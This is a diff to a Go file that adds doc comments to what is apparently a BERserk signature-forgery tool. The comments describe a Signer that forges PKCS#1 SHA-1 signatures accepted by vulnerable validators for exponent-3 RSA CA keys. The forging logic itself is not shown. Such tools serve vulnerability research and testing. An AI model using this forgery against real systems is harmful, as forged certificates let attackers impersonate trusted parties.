@@ -8,10 +8,17 @@ import (
 	"io"
 )
 
+// Signer is a crypto.Signer that given a x509.Certificate with a RSA public key
+// with e = 3 and length 1024 or 2048, will generate PKCS#1 signatures that
+// exploit BERserk without knowledge of the private key.
 type Signer struct {
 	publicKey *rsa.PublicKey
 }
 
+// New will return a new Signer that generates signatures that will look valid
+// for the given CA certificate.
+//
+// ca must have a RSA key with length 1024 or 2048 and exponent 3.
 func New(ca *x509.Certificate) (*Signer, x509.SignatureAlgorithm, error) {
 	if ca.PublicKeyAlgorithm != x509.RSA {
 		return nil, 0, errors.New("only RSA is supported")
@@ -34,10 +41,19 @@ func New(ca *x509.Certificate) (*Signer, x509.SignatureAlgorithm, error) {
 	}
 }
 
+// Public returns the Signer's CA RSA public key
 func (s *Signer) Public() crypto.PublicKey {
 	return s.publicKey
 }
 
+// Sign will generate a PKCS#1 signature of msg that will be accepted as valid
+// by BERserk affected validators.
+//
+// ErrRetry is returned when a signature can't be generated for the specific
+// input. Change a variable field (i.e. serial number) in the message and retry.
+//
+// rand is ignored and can be nil.
+// Only opts.HashFunc() == crypto.SHA1 is supported.
 func (s *Signer) Sign(rand io.Reader, msg []byte, opts crypto.SignerOpts) (signature []byte, err error) {
 	switch {
 	case s.publicKey.N.BitLen() == 2048 && opts.HashFunc() == crypto.SHA1:
